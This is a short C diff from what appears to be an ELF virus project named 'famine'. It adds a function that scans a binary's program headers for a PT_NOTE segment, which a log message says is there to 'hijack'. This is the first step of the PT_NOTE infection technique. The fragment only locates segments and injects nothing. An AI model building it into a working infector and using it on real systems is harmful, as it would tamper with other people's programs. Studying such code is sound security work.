@@ -13,3 +13,19 @@ int is_valid_elf(const Elf64_Ehdr *elf)
 		return (LOG("not an executable or PIE\n"), 0);
 	return (1);
 }
+
+int find_segments(t_famine *f)
+{
+	f->note = NULL;
+	f->phdr_vaddr = f->ehdr->e_phoff;
+	for (int i = 0; i < f->ehdr->e_phnum; i++)
+	{
+		if (f->phdr[i].p_type == PT_NOTE && !f->note)
+			f->note = &f->phdr[i];
+		if (f->phdr[i].p_type == PT_PHDR)
+			f->phdr_vaddr = f->phdr[i].p_vaddr;
+	}
+	if (!f->note)
+		return (LOG("no PT_NOTE segment to hijack\n"), 1);
+	return (0);
+}
